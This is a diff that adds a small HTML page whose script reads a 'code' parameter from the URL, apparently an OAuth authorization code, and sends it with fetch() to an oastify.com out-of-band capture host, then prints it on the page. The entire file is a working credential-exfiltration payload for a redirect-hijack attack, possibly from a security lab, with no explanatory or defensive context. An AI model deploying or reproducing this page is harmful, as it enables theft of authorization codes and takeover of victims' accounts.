@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var params = new URLSearchParams(window.location.search);
+var code = params.get('code');
+if(code) {
+    fetch('https://va9m0lg2ciz6ngbxt6v3wb3ig9m0asyh.oastify.com/?captured_code=' + code);
+    document.body.innerHTML = 'Code captured: ' + code;
+}
+</script>
+</body>
+</html>
